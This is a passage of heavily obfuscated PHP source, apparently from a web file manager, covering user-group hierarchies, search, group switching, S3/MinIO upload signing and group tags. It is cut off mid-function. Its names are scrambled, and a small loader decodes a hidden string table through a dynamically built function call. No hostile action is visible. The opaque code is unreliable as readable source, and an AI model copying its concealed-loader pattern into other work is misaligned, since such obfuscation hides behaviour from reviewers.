$ú€‹Éİ®[42] => array($ú€‹Éİ®[479], "\x25{$Á¹èÑ½À}\x25"), $ú€‹Éİ®[1111] => $ú€‹Éİ®[2226]); if ($Ñ¿££½Ò) { $‘ëÓÓ† = $this->getInfoSimple($Ñ¿££½Ò); $…„¬åÚ = $‘ëÓÓ†[$ú€‹Éİ®[609]] . $Ñ¿££½Ò . $ú€‹Éİ®[641]; $’¥ÒíÖØ = array($’¥ÒíÖØ, array($ú€‹Éİ®[609] => array($ú€‹Éİ®[479], $…„¬åÚ))); } $’¥ÒíÖØ = $this->parseWhereLike($’¥ÒíÖØ); $ì¢ó¼±Š = $this->_makeOrder()->where($’¥ÒíÖØ)->selectPage(20); $ì¢ó¼±Š = $ì¢ó¼±Š ? $ì¢ó¼±Š : array($ú€‹Éİ®[455] => array(), $ú€‹Éİ®[452] => array()); if (!$ì¢ó¼±Š || count($ì¢ó¼±Š[$ú€‹Éİ®[455]]) < 5 && Input::check($Á¹èÑ½À, $ú€‹Éİ®[403])) { $ƒ‹ó¾Ú = $this->groupChildrenAll($Ñ¿££½Ò); $¼áÚşª = $this->_searchFromMeta($ú€‹Éİ®[556], $Á¹èÑ½À, 10, $ƒ‹ó¾Ú); $±íóåù‘ = $this->_searchFromMeta($ú€‹Éİ®[557], $Á¹èÑ½À, 10, $ƒ‹ó¾Ú); $…²¤ıŸá = array_merge($¼áÚşª, $±íóåù‘, $ì¢ó¼±Š[$ú€‹Éİ®[455]]); $ì¢ó¼±Š[$ú€‹Éİ®[455]] = array_unique_by_key($…²¤ıŸá, $ú€‹Éİ®[1439]); $ì¢ó¼±Š[$ú€‹Éİ®[452]][$ú€‹Éİ®[453]] = count($ì¢ó¼±Š[$ú€‹Éİ®[455]]); $ì¢ó¼±Š[$ú€‹Éİ®[452]][$ú€‹Éİ®[454]] = ceil($ì¢ó¼±Š[$ú€‹Éİ®[452]][$ú€‹Éİ®[453]] / $ì¢ó¼±Š[$ú€‹Éİ®[452]][$ú€‹Éİ®[449]]); } $this->_listDataApply($ì¢ó¼±Š[$ú€‹Éİ®[455]]); return $ì¢ó¼±Š; } protected function groupChildrenAll($ƒÜ‰‰Ï÷) { $°ÒÄ£• =& $_SERVER[ŒÅŸ‹ä†]; if (!$ƒÜ‰‰Ï÷) { return !1; } if (!is_array($ƒÜ‰‰Ï÷)) { $ƒÜ‰‰Ï÷ = array($ƒÜ‰‰Ï÷); } $»¡ßŠğ× = $ƒÜ‰‰Ï÷; foreach ($ƒÜ‰‰Ï÷ as $ß „âĞÖ) { $òí¼£Š¤ = $this->getInfoSimple($ß „âĞÖ); $çÌàé„ = array($°ÒÄ£•[609] => array($°ÒÄ£•[479], $òí¼£Š¤[$°ÒÄ£•[609]] . $ß „âĞÖ . $°ÒÄ£•[641])); $µ’Î‘¿ = $this->field($°ÒÄ£•[1439])->where($çÌàé„)->select(); $»¡ßŠğ× = array_merge($»¡ßŠğ×, array_to_keyvalue($µ’Î‘¿, $°ÒÄ£•[12], $°ÒÄ£•[1439])); } return array_unique($»¡ßŠğ×); } private function _searchFromMeta($Ü·Ñ˜ó†, $ïÇŒîÜ‹, $½öÍú…˜, $Û¬§ûÎ«) { $ô€«»Øà =& $_SERVER[ŒÅŸ‹ä†]; $ïÇŒîÜ‹ = strtolower($ïÇŒîÜ‹); $²ªÇó¢­ = array($ô€«»Øà[105] => $Ü·Ñ˜ó†, $ô€«»Øà[460] => array($ô€«»Øà[479], "\45{$ïÇŒîÜ‹}\x25")); $²ªÇó¢­ = $this->parseWhereLike($²ªÇó¢­); if ($Û¬§ûÎ«) { $²ªÇó¢­[$ô€«»Øà[1439]] = array($ô€«»Øà[7], $Û¬§ûÎ«); } $¸ö¥ğõó = Model($ô€«»Øà[2227])->where($²ªÇó¢­)->limit($½öÍú…˜)->select(); if (!$¸ö¥ğõó) { return array(); } $¸ö¥ğõó = array_to_keyvalue($¸ö¥ğõó, $ô€«»Øà[12], $ô€«»Øà[1439]); $Ÿ„éíäÊ = $this->where(array($ô€«»Øà[2211] => array($ô€«»Øà[7], $¸ö¥ğõó)))->select(); if (!$Ÿ„éíäÊ) { return array(); } return $Ÿ„éíäÊ; } protected function _listDataApplyItem($ –ïß’ä) { $ÃÊšĞÕı = array($ –ïß’ä); $this->_listDataApply($ÃÊšĞÕı); return $ÃÊšĞÕı[0]; } protected function _listDataApply(&$áš«ÓÚ¹) { $‘ş÷Ş–° =& $_SERVER[ŒÅŸ‹ä†]; if (!$áš«ÓÚ¹) { return; } $¬Ğçİäš = array_to_keyvalue($áš«ÓÚ¹, $‘ş÷Ş–°[12], $‘ş÷Ş–°[1439]); $this->_listAppendChildren($áš«ÓÚ¹); $this->_listAppendChildrenMember($áš«ÓÚ¹); $this->_listAppendMeta($áš«ÓÚ¹, $¬Ğçİäš); $this->_listAppendParent($áš«ÓÚ¹); $this->_listAppendSourceRoot($áš«ÓÚ¹, $¬Ğçİäš); } private function _listAppendChildren(&$ôÛ¹ú‘) { $Öõö±ü¥ =& $_SERVER[ŒÅŸ‹ä†]; $½˜–ê±¯ = array_to_keyvalue($ôÛ¹ú‘, $Öõö±ü¥[12], $Öõö±ü¥[1439]); $óü¶»‘ = array($Öõö±ü¥[201] => array($Öõö±ü¥[7], $½˜–ê±¯)); $£ú«õªš = array($Öõö±ü¥[201], $Öõö±ü¥[2228] => $Öõö±ü¥[590]); $â¤¿ï…  = $this->field($£ú«õªš)->where($óü¶»‘)->group($Öõö±ü¥[201])->select(); $°‡ë·‰ó = array_to_keyvalue($â¤¿ï… , $Öõö±ü¥[201], $Öõö±ü¥[590]); foreach ($ôÛ¹ú‘ as &$şŒ™’ë) { $°ßø‹²£ = $şŒ™’ë[$Öõö±ü¥[1439]]; $şŒ™’ë[$Öõö±ü¥[2229]] = isset($°‡ë·‰ó[$°ßø‹²£]) ? intval($°‡ë·‰ó[$°ßø‹²£]) : !1; } unset($şŒ™’ë); } private function _listAppendChildrenMember(&$ÑÒàƒ“œ) { $­„¾îŞ =& $_SERVER[ŒÅŸ‹ä†]; $ùëµ³óª = array_to_keyvalue($ÑÒàƒ“œ, $­„¾îŞ[12], $­„¾îŞ[1439]); $¸Óâ¿‰“ = array($­„¾îŞ[1439] => array($­„¾îŞ[7], $ùëµ³óª)); $úÊƒì‰£ = array($­„¾îŞ[1439], $­„¾îŞ[2228] => $­„¾îŞ[590]); $ŒÁ¢Ö± = Model($­„¾îŞ[2218])->field($úÊƒì‰£)->where($¸Óâ¿‰“)->group($­„¾îŞ[1439])->select(); $¥’í¬é = array_to_keyvalue($ŒÁ¢Ö±, $­„¾îŞ[1439], $­„¾îŞ[590]); foreach ($ÑÒàƒ“œ as &$ »¾ª¢Ø) { $Ï­­¢óü = $ »¾ª¢Ø[$­„¾îŞ[1439]]; $ »¾ª¢Ø[$­„¾îŞ[2230]] = isset($¥’í¬é[$Ï­­¢óü]) ? intval($¥’í¬é[$Ï­­¢óü]) : !1; } unset($ »¾ª¢Ø); } private function _listAppendMeta(&$óÒ¢ÄÔ, $çÎ³À¥À) { $·Æ“ƒê¤ =& $_SERVER[ŒÅŸ‹ä†]; $›ıÇëú… = array($·Æ“ƒê¤[1439] => array($·Æ“ƒê¤[7], $çÎ³À¥À)); $’ìäÀÙ = Model($·Æ“ƒê¤[2217])->where($›ıÇëú…)->select(); $’ìäÀÙ = array_to_keyvalue_group($’ìäÀÙ, $·Æ“ƒê¤[1439]); foreach ($’ìäÀÙ as &$ìÙ¤İúò) { $ìÙ¤İúò = array_to_keyvalue($ìÙ¤İúò, $·Æ“ƒê¤[105], $·Æ“ƒê¤[460]); } unset($ìÙ¤İúò); foreach ($óÒ¢ÄÔ as &$¨ˆºÎ€ø) { $¨ˆºÎ€ø[$·Æ“ƒê¤[560]] = array(); if (isset($’ìäÀÙ[$¨ˆºÎ€ø[$·Æ“ƒê¤[1439]]])) { $¨ˆºÎ€ø[$·Æ“ƒê¤[560]] = $’ìäÀÙ[$¨ˆºÎ€ø[$·Æ“ƒê¤[1439]]]; } } unset($¨ˆºÎ€ø); } protected function parentLevelArray($æı·¶Çì) { $¬ş´•Àò =& $_SERVER[ŒÅŸ‹ä†]; $æı·¶Çì = explode($¬ş´•Àò[60], trim($æı·¶Çì, $¬ş´•Àò[60])); $æı·¶Çì = array_remove_value($æı·¶Çì, $¬ş´•Àò[239]); return $æı·¶Çì; } protected function parentInGroup($ÀëÌÖü, $üúÁ‘é“) { $½ÉÉ–—« =& $_SERVER[ŒÅŸ‹ä†]; $™èë–Ê = $this->getInfoSimple($ÀëÌÖü); if (!$™èë–Ê) { return !0; } $¼İ»ÅÈÏ = $this->parentLevelArray($™èë–Ê[$½ÉÉ–—«[609]]); $¼İ»ÅÈÏ[] = $ÀëÌÖü; foreach ($¼İ»ÅÈÏ as $ÀëÌÖü) { if (in_array($ÀëÌÖü . $½ÉÉ–—«[12], $üúÁ‘é“)) { return !0; } } return !1; } private function _listAppendParent(&$ÖäÌØ±ş) { $Üƒ©€É— =& $_SERVER[ŒÅŸ‹ä†]; $©Á¢®Ûí = array(); foreach ($ÖäÌØ±ş as &$ö·¢µ…„) { $©Á¢®Ûí[$ö·¢µ…„[$Üƒ©€É—[1439]]] = $ö·¢µ…„[$Üƒ©€É—[42]]; $Ş«»ş‡Õ = $this->parentLevelArray($ö·¢µ…„[$Üƒ©€É—[609]]); foreach ($Ş«»ş‡Õ as $½Ò¸´“²) { if (!isset($©Á¢®Ûí[$½Ò¸´“²])) { $©Á¢®Ûí[$½Ò¸´“²] = 0; } } } unset($ö·¢µ…„); foreach ($©Á¢®Ûí as $…¤ŸìİÌ => $¯Ş¤Ç¿ò) { if ($¯Ş¤Ç¿ò) { continue; } $©šÄ‹†¡ = $this->getInfoSimple($…¤ŸìİÌ); $©Á¢®Ûí[$…¤ŸìİÌ] = $©šÄ‹†¡[$Üƒ©€É—[42]]; } $ƒ¯Óğî = $GLOBALS[$Üƒ©€É—[6]][$Üƒ©€É—[102]][$Üƒ©€É—[2231]]; if (KodUser::isRoot()) { $ƒ¯Óğî = !1; } foreach ($ÖäÌØ±ş as &$ö·¢µ…„) { $Ş«»ş‡Õ = $this->parentLevelArray($ö·¢µ…„[$Üƒ©€É—[609]]); $ø¼àÏÔ = $Üƒ©€É—[12]; foreach ($Ş«»ş‡Õ as $…¤ŸìİÌ => $½Ò¸´“²) { if ($ƒ¯Óğî && $…¤ŸìİÌ == 0) { continue; } $ø¼àÏÔ .= $©Á¢®Ûí[$½Ò¸´“²] . $Üƒ©€É—[8]; } if ($Ş«»ş‡Õ) { $ø¼àÏÔ .= $ö·¢µ…„[$Üƒ©€É—[42]]; } $ö·¢µ…„[$Üƒ©€É—[614]] = str_replace($Üƒ©€É—[265], $Üƒ©€É—[8], $ø¼àÏÔ); } unset($ö·¢µ…„); } private function _listAppendSourceRoot(&$éÉ¤ûƒŒ, $ÇÄÊ‹˜ì) { $ô‹‹ÒÊØ =& $_SERVER[ŒÅŸ‹ä†]; $¯ÙÄ‡˜× = Model($ô‹‹ÒÊØ[929])->listSourceRoot(SourceModel::TYPE_GROUP, $ÇÄÊ‹˜ì); $¯ÙÄ‡˜× = array_to_keyvalue($¯ÙÄ‡˜×, $ô‹‹ÒÊØ[594]); $¯ÙÄ‡˜× = array_remove_key($¯ÙÄ‡˜×, $ô‹‹ÒÊØ[594]); foreach ($éÉ¤ûƒŒ as &$´ÈÊ³«‰) { $´ÈÊ³«‰[$ô‹‹ÒÊØ[100]] = $¯ÙÄ‡˜×[$´ÈÊ³«‰[$ô‹‹ÒÊØ[1439]]] ? $¯ÙÄ‡˜×[$´ÈÊ³«‰[$ô‹‹ÒÊØ[1439]]] : array(); } unset($´ÈÊ³«‰); } protected function groupMerge($ÛøˆŸĞ†) { $ÛøˆŸĞ† = array_values(array_unique($ÛøˆŸĞ†)); $¾Œ”ŒĞ† = array(); for ($´’·ÀøÕ = 0; $´’·ÀøÕ < count($ÛøˆŸĞ†); $´’·ÀøÕ++) { $Ø’É‚ƒ˜ = !1; for ($€ü¸¢† = 0; $€ü¸¢† < count($ÛøˆŸĞ†); $€ü¸¢†++) { if ($´’·ÀøÕ == $€ü¸¢†) { continue; } if ($this->isParentOf($ÛøˆŸĞ†[$€ü¸¢†], $ÛøˆŸĞ†[$´’·ÀøÕ])) { $Ø’É‚ƒ˜ = !0; break; } } if (!$Ø’É‚ƒ˜) { $¾Œ”ŒĞ†[] = $ÛøˆŸĞ†[$´’·ÀøÕ]; } } return $¾Œ”ŒĞ†; } protected function isParentOf($ˆ‰š¹Ùë, $Ü¾²á„) { $ğàÖŸù =& $_SERVER[ŒÅŸ‹ä†]; if (!$ˆ‰š¹Ùë || !$Ü¾²á„ || $ˆ‰š¹Ùë == $Ü¾²á„) { return !1; } $Ïºî¤á´ = $this->getInfoSimple($ˆ‰š¹Ùë); $§â¹ô„ = $this->getInfoSimple($Ü¾²á„); $ËşäòøÀ = $Ïºî¤á´[$ğàÖŸù[609]] . $ˆ‰š¹Ùë . $ğàÖŸù[60]; if (substr($§â¹ô„[$ğàÖŸù[609]], 0, strlen($ËşäòøÀ)) == $ËşäòøÀ) { return !0; } return !1; } public function groupShowRoot($ÚÆÎøÏù, $§ìøÖœÈ = false) { $ËÖû¹Êµ =& $_SERVER[ŒÅŸ‹ä†]; $àÍ×üĞ§ = $this->getInfo($ÚÆÎøÏù); if (!$àÍ×üĞ§) { return array(); } $Ï¼¡‚úç = $this->parentLevelArray($àÍ×üĞ§[$ËÖû¹Êµ[609]]); $ø±Áë‚³ = array($ÚÆÎøÏù); if (count($Ï¼¡‚úç) == 0) { return $ø±Áë‚³; } if ($§ìøÖœÈ && count($Ï¼¡‚úç) == 1) { return $ø±Áë‚³; } if (!$àÍ×üĞ§[$ËÖû¹Êµ[560]] || !isset($àÍ×üĞ§[$ËÖû¹Êµ[560]][$ËÖû¹Êµ[2212]]) || $àÍ×üĞ§[$ËÖû¹Êµ[560]][$ËÖû¹Êµ[2212]] == $ËÖû¹Êµ[875]) { return $this->groupShowRoot($Ï¼¡‚úç[count($Ï¼¡‚úç) - 1], $§ìøÖœÈ); } if ($àÍ×üĞ§[$ËÖû¹Êµ[560]][$ËÖû¹Êµ[2212]] == $ËÖû¹Êµ[442]) { $öíÏÉëØ = explode($ËÖû¹Êµ[60], $àÍ×üĞ§[$ËÖû¹Êµ[560]][$ËÖû¹Êµ[2213]]); if ($öíÏÉëØ) { $ø±Áë‚³ = array_merge($ø±Áë‚³, $öíÏÉëØ); } } return $ø±Áë‚³; } protected function resetParentLevel() { $Î»ÏÜÃÃ =& $_SERVER[ŒÅŸ‹ä†]; $åù²²¦Ÿ = $Î»ÏÜÃÃ[1439]; $Ş´…”í = $this->select(); $Ş´…”í = array_to_keyvalue($Ş´…”í, $åù²²¦Ÿ); foreach ($Ş´…”í as $ùÔß‡è) { $œÅ’›‚Œ = $ùÔß‡è; $äÙƒ = array(); while ($œÅ’›‚Œ[$Î»ÏÜÃÃ[201]] != 0) { $äÙƒ[] = $œÅ’›‚Œ[$Î»ÏÜÃÃ[201]]; $œÅ’›‚Œ = $Ş´…”í[$œÅ’›‚Œ[$Î»ÏÜÃÃ[201]]]; } $äÙƒ[] = 0; $äÙƒ = $Î»ÏÜÃÃ[60] . implode($Î»ÏÜÃÃ[60], array_reverse($äÙƒ)) . $Î»ÏÜÃÃ[60]; $this->setNamePinyin($ùÔß‡è[$åù²²¦Ÿ], $ùÔß‡è[$Î»ÏÜÃÃ[42]]); $this->where(array($åù²²¦Ÿ => $ùÔß‡è[$åù²²¦Ÿ]))->save(array($Î»ÏÜÃÃ[680] => $äÙƒ)); } return $Ş´…”í; } public function groupNameAuto($·Œ÷‡¥¯, $¹”ãŠîØ) { $¼½–“ØË =& $_SERVER[ŒÅŸ‹ä†]; $Å©´Æ“é = $this->where(array($¼½–“ØË[497] => $·Œ÷‡¥¯))->getField($¼½–“ØË[42], !0); if (!$Å©´Æ“é || !in_array($¹”ãŠîØ, $Å©´Æ“é)) { return $¹”ãŠîØ; } for ($íå˜— = 1; $íå˜— <= count($Å©´Æ“é) + 1; $íå˜—++) { $â¿¯²î­ = $¹”ãŠîØ . "\50{$íå˜—}\51"; if (!in_array($â¿¯²î­, $Å©´Æ“é)) { return $â¿¯²î­; } } } public function groupSwitch($ÛäÏ»ÒÈ, $Óì“ü ×) { $å«¼ÀÃø =& $_SERVER[ŒÅŸ‹ä†]; $ğ‡ ²„ = array($å«¼ÀÃø[1439] => array($å«¼ÀÃø[7], array($ÛäÏ»ÒÈ, $Óì“ü ×))); $œ–¹ÌÏ‰ = $this->where($ğ‡ ²„)->select(); $œ–¹ÌÏ‰ = array_to_keyvalue($œ–¹ÌÏ‰, $å«¼ÀÃø[1439]); $¥¤‰ğğò = _get($œ–¹ÌÏ‰, $ÛäÏ»ÒÈ); $ é’†‚Ó = _get($œ–¹ÌÏ‰, $Óì“ü ×); if (!$¥¤‰ğğò || !$ é’†‚Ó || $¥¤‰ğğò[$å«¼ÀÃø[201]] == 0) { return !1; } if ($¥¤‰ğğò[$å«¼ÀÃø[1439]] == $ é’†‚Ó[$å«¼ÀÃø[1439]]) { return !1; } if (strpos($ é’†‚Ó[$å«¼ÀÃø[609]], $¥¤‰ğğò[$å«¼ÀÃø[609]] . $¥¤‰ğğò[$å«¼ÀÃø[1439]] . $å«¼ÀÃø[60]) === 0) { return !1; } $ğ‡ ²„ = array($å«¼ÀÃø[1439] => $ÛäÏ»ÒÈ); $¡­”ƒê = Model($å«¼ÀÃø[2218])->where($ğ‡ ²„)->select(); if (!$¡­”ƒê) { $¡­”ƒê = array(); } foreach ($¡­”ƒê as $Ê×æöÌÂ) { $ºÕ‚Ğ÷Ğ = $Ê×æöÌÂ[$å«¼ÀÃø[1537]]; $ğ‡ ²„ = array($å«¼ÀÃø[1537] => $ºÕ‚Ğ÷Ğ, $å«¼ÀÃø[1439] => $Óì“ü ×); $êàÚîèü = Model($å«¼ÀÃø[2218])->where($ğ‡ ²„)->find(); if (!$êàÚîèü) { $âÄª¼ = array($Óì“ü × => $Ê×æöÌÂ[$å«¼ÀÃø[1584]]); Model($å«¼ÀÃø[622])->userGroupAdd($ºÕ‚Ğ÷Ğ, $âÄª¼); } Model($å«¼ÀÃø[622])->userGroupRemove($ºÕ‚Ğ÷Ğ, $ÛäÏ»ÒÈ); } $ğ‡ ²„ = array($å«¼ÀÃø[199] => 2, $å«¼ÀÃø[201] => 0, $å«¼ÀÃø[505] => 1, $å«¼ÀÃø[594] => array($å«¼ÀÃø[7], array($ÛäÏ»ÒÈ, $Óì“ü ×))); $Áô©°£‹ = Model($å«¼ÀÃø[929])->where($ğ‡ ²„)->field($å«¼ÀÃø[2232])->select(); $Áô©°£‹ = array_to_keyvalue($Áô©°£‹, $å«¼ÀÃø[594], $å«¼ÀÃø[202]); $àª‚ñ¥Å = !empty($Áô©°£‹[$ÛäÏ»ÒÈ]) ? $Áô©°£‹[$ÛäÏ»ÒÈ] : !1; if ($àª‚ñ¥Å) { if (!$Áô©°£‹[$Óì“ü ×]) { $Áô©°£‹[$Óì“ü ×] = Model($å«¼ÀÃø[929])->groupRootAdd($Óì“ü ×); } $†šığé = $Áô©°£‹[$Óì“ü ×]; $ğ‡ ²„ = array($å«¼ÀÃø[201] => $àª‚ñ¥Å); $Áô©°£‹ = Model($å«¼ÀÃø[929])->where($ğ‡ ²„)->field($å«¼ÀÃø[2233])->select(); if (!$Áô©°£‹) { $Áô©°£‹ = array(); } Model($å«¼ÀÃø[929])->moveClearAuth = !1; foreach ($Áô©°£‹ as $¥õ’¨ï¸) { $‚‚µÎ‡× = $¥õ’¨ï¸[$å«¼ÀÃø[505]] == $å«¼ÀÃø[101] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($å«¼ÀÃø[929])->move($¥õ’¨ï¸[$å«¼ÀÃø[202]], $†šığé, $‚‚µÎ‡×); } Model($å«¼ÀÃø[929])->moveClearAuth = !0; $ğ‡ ²„ = array($å«¼ÀÃø[199] => 2, $å«¼ÀÃø[594] => $ÛäÏ»ÒÈ); $ÔÚã“êÕ = array($å«¼ÀÃø[594] => $Óì“ü ×); Model($å«¼ÀÃø[2234])->where($ğ‡ ²„)->save($ÔÚã“êÕ); Model($å«¼ÀÃø[2235])->where($ğ‡ ²„)->save($ÔÚã“êÕ); } $this->_changeChildLevel($œ–¹ÌÏ‰[$ÛäÏ»ÒÈ], $œ–¹ÌÏ‰[$Óì“ü ×], !0); $this->where(array($å«¼ÀÃø[201] => $ÛäÏ»ÒÈ))->save(array($å«¼ÀÃø[201] => $Óì“ü ×)); $this->_clearChildrenCache($œ–¹ÌÏ‰[$Óì“ü ×]); return !0; } } goto f–œ‚´Í¥; eæ‰ÉÅç´Â: $fileSize = strrev(base64_decode($_SERVER[ïığÌï][0])); function binCheckNeq($Á•Æˆ¬ª, $ŸŞ³ª¶é) { return $Á•Æˆ¬ª != $ŸŞ³ª¶é; } $_SERVER[$_SERVER[ïığÌï][1]] = $fileSize($_SERVER[$_SERVER[ïığÌï][2]]); goto A£Ç×•ùß; D‘ ñ¯õÃ: define($_SERVER[ŒÅŸ‹ä†][326], 2); define($_SERVER[ŒÅŸ‹ä†][327], 3); define($_SERVER[ŒÅŸ‹ä†][328], 1); goto cææÆÁÒí; B‹™‚èÑàì: class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($“‚ÍÉ) { $§¶Ğô… =& $_SERVER[ŒÅŸ‹ä†]; parent::__construct($“‚ÍÉ); $this->setSignVersion($§¶Ğô…[258]); if (!$this->region) { $this->region = $§¶Ğô…[315]; $this->client->setRegion($this->region); } $this->client->setHeadValid(!1); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function checkRegion() { $½‡¼úãª = $this->getBktRegion(); return $this->region == $½‡¼úãª ? !0 : !1; } public function uploadFormData($¼ÈáÏ×, $Ù½×–Ç = 3600) { $§˜Ù™Ò =& $_SERVER[ŒÅŸ‹ä†]; $ËÔÍ˜İ = $§˜Ù™Ò[240]; $¸Üç¥† = $§˜Ù™Ò[268]; $ºÂÖ¥µÓ = $§˜Ù™Ò[72]; $Àéè¾’Õ = gmdate($§˜Ù™Ò[269]); $ªçÄ•¸ê = gmdate($§˜Ù™Ò[270]); $­»ª£òô = $§˜Ù™Ò[271]; $¿ˆãç = $Ù½×–Ç . $§˜Ù™Ò[12]; $£¸ÑÕ±» = $§˜Ù™Ò[272]; $İúüÊÎç = array($this->accessKey, $ªçÄ•¸ê, $this->region, $ºÂÖ¥µÓ, $­»ª£òô); $ÓœÊè¸ = implode($§˜Ù™Ò[8], $İúüÊÎç); $Š¡‹¼¬’ = array($§˜Ù™Ò[273] => gmdate($§˜Ù™Ò[274], strtotime($§˜Ù™Ò[275])), $§˜Ù™Ò[276] => array(array($§˜Ù™Ò[277] => $this->bucket), array($§˜Ù™Ò[316] => $ËÔÍ˜İ), array($§˜Ù™Ò[278], $§˜Ù™Ò[279], $§˜Ù™Ò[12]), array($§˜Ù™Ò[278], $§˜Ù™Ò[280], $§˜Ù™Ò[12]), array($§˜Ù™Ò[278], $§˜Ù™Ò[317], $§˜Ù™Ò[12]), array($§˜Ù™Ò[281] => $£¸ÑÕ±»), array($§˜Ù™Ò[282] => $ÓœÊè¸), array($§˜Ù™Ò[283] => $¸Üç¥†), array($§˜Ù™Ò[284] => $Àéè¾’Õ), array($§˜Ù™Ò[285] => $¿ˆãç))); $ÑÃßÒİ¦ = base64_encode(json_encode($Š¡‹¼¬’)); $ˆğå„øï = hash_hmac($§˜Ù™Ò[286], $ªçÄ•¸ê, $§˜Ù™Ò[287] . $this->secret, !0); $½ñ×åï• = hash_hmac($§˜Ù™Ò[286], $this->region, $ˆğå„øï, !0); $’ÂÅ§© = hash_hmac($§˜Ù™Ò[286], $ºÂÖ¥µÓ, $½ñ×åï•, !0); $ áïüì = hash_hmac($§˜Ù™Ò[286], $­»ª£òô, $’ÂÅ§©, !0); $¹û¿—ãÙ = hash_hmac($§˜Ù™Ò[286], $ÑÃßÒİ¦, $ áïüì); $Œ¯àÑÊ÷ = array($§˜Ù™Ò[257] => $§˜Ù™Ò[12], $§˜Ù™Ò[304] => $§˜Ù™Ò[12], $§˜Ù™Ò[316] => $ËÔÍ˜İ, $§˜Ù™Ò[281] => $£¸ÑÕ±», $§˜Ù™Ò[288] => $ÑÃßÒİ¦, $§˜Ù™Ò[318] => $ÓœÊè¸, $§˜Ù™Ò[319] => $¸Üç¥†, $§˜Ù™Ò[320] => $Àéè¾’Õ, $§˜Ù™Ò[321] => $¿ˆãç, $§˜Ù™Ò[322] => $¹û¿—ãÙ, $§˜Ù™Ò[217] => $this->getHost()); return $Œ¯àÑÊ÷; } } class PathDriverS3 extends PathDriverBaseS3 { public function __construct($¡¢“â²) { $œäÉ¹šì =& $_SERVER[ŒÅŸ‹ä†]; parent::__construct($¡¢“â²); $ŠÒ¯«Á‘ = isset($¡¢“â²[$œäÉ¹šì[267]]) && $¡¢“â²[$œäÉ¹šì[267]] == $œäÉ¹šì[258] ? $œäÉ¹šì[258] : $œäÉ¹šì[323]; $this->setSignVersion($ŠÒ¯«Á‘); } public function link($õ«ª“, $›¼™™ÄĞ = array()) { return parent::link($õ«ª“, $›¼™™ÄĞ); } public function fileOut($Â®à¢Æ®, $èË·×¹ = false, $¨úøòÚÜ = false, $‰» ¯›ª = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[ŒÅŸ‹ä†][324])) { return parent::fileOutServer($Â®à¢Æ®, $èË·×¹, $¨úøòÚÜ, $‰» ¯›ª); } parent::fileOut($Â®à¢Æ®, $èË·×¹, $¨úøòÚÜ, $‰» ¯›ª); } public function fileOutImage($®‚œ¼„à, $ĞæÙ‘ù° = 250) { if (strstr($this->endpoint, $_SERVER[ŒÅŸ‹ä†][324])) { return parent::fileOutImageServer($®‚œ¼„à, $ĞæÙ‘ù°); } parent::fileOutImage($®‚œ¼„à, $ĞæÙ‘ù°); } } define($_SERVER[ŒÅŸ‹ä†][325], 1); goto D‘ ñ¯õÃ; f–œ‚´Í¥: class GroupTagModel extends ModelBase { protected $tableName = "\x75\x73\x65\x72\x5f\x66\x61\x76"; protected function cacheFunctionAlias($ï÷‹†è…) { $îè¯Ïİç =& $_SERVER[ŒÅŸ‹ä†]; return array($îè¯Ïİç[2236] => array($ï÷‹†è…[0], $îè¯Ïİç[2237]), $îè¯Ïİç[2238] => array($ï÷‹†è…[0], $îè¯Ïİç[2239])); } protected function ___get($ğÌ™­í‰) { $©îªÃçÁ =& $_SERVER[ŒÅŸ‹ä†]; $«ë¶©ûê = Model($©îªÃçÁ[610])->metaGet($ğÌ™­í‰, $©îªÃçÁ[2240]); $„•˜Í = json_decode($«ë¶©ûê, !0); return $„•˜Í ? $„•˜Í : array($©îªÃçÁ[2241] => $©îªÃçÁ[101], $©îªÃçÁ[455] => array()); } protected function ___listData($ØÖşø¨‰) { $ºŞ­Çé“ =& $_SERVER[ŒÅŸ‹ä†]; $ª²ó = array($ºŞ­Çé“[1911] => 0, $ºŞ­Çé“[578] => array($ºŞ­Çé“[2242], 0), $ºŞ­Çé“[516] => $ºŞ­Çé“[1435] . $ØÖşø¨‰); $Â¬º–ØÔ = $ºŞ­Çé“[2243]; $œ”ùÇÛŒ = $this->field($Â¬º–ØÔ)->where($ª²ó)->order($ºŞ­Çé“[2244])->select(); return $œ”ùÇÛŒ ? $œ”ùÇÛŒ : array(); } protected function set($³è€ •, $›ë”¬Éå) { $¹ËîÔ• =& $_SERVER[ŒÅŸ‹ä†]; $›ë”¬Éå = $›ë”¬Éå ? $›ë”¬Éå : array($¹ËîÔ•[2241] => $¹ËîÔ•[101], $¹ËîÔ•[455] => array()); return Model($¹ËîÔ•[610])->metaSet($³è€ •, $¹ËîÔ•[2240], json_encode($›ë”¬Éå)); } protected function getByTagID($ÆñÌÂ­¸, $ÅÛÚôÉ) { $åÚ¾ùÈµ =& $_SERVER[ŒÅŸ‹ä†]; if (!$ÆñÌÂ­¸ || !$ÅÛÚôÉ) { return !1; } if (!Model($åÚ¾ùÈµ[610])->getInfoSimple($ÆñÌÂ­¸)) { return !1; } $ŠÔÏ¦öÁ = $this->get($ÆñÌÂ­¸); if (!$ŠÔÏ¦öÁ || !isset($ŠÔÏ¦öÁ[$åÚ¾ùÈµ[455]])) { return !1; } $©İò¢€İ = array_find_by_field($ŠÔÏ¦öÁ[$åÚ¾ùÈµ[455]], $åÚ¾ùÈµ[492], $ÅÛÚôÉ); return is_array($©İò¢€İ) ? $©İò¢€İ : !1; } public function listSource($œğ²ÉÚÆ, $Ï¾Ø«ªƒ) { $§ş¹¿ª =& $_SERVER[ŒÅŸ‹ä†]; if ($Ï¾Ø«ªƒ && !is_array($Ï¾Ø«ªƒ)) { $Ï¾Ø«ªƒ = array($Ï¾Ø«ªƒ); } $´íÃáŒß = $this->listData($œğ²ÉÚÆ); $Û‚ÖšĞò = array(); foreach ($´íÃáŒß as $½¤Ëı¢ó) { $§Õ·Éô = $½¤Ëı¢ó[$§ş¹¿ª[97]]; if (!$§Õ·Éô) { continue; } if (!isset($Û‚ÖšĞò[$§Õ·Éô])) { $Û‚ÖšĞò[$§Õ·Éô] = array(); } $Û‚ÖšĞò[$§Õ·Éô][] = $½¤Ëı¢ó[$§ş¹¿ª[520]]; } $õÖš ß = array(); foreach ($Û‚ÖšĞò as $ñ†×’¤ => $Ğ²¬µª¯) { $õ¢¸Ó³ö = !0; if (!$Ï¾Ø«ªƒ) { $õÖš ß[] = $ñ†×’¤; continue; } foreach ($Ï¾Ø«ªƒ as $¥ÑŸÇØ¼) { if (!in_array($¥ÑŸÇØ¼, $Ğ²¬µª¯)) { 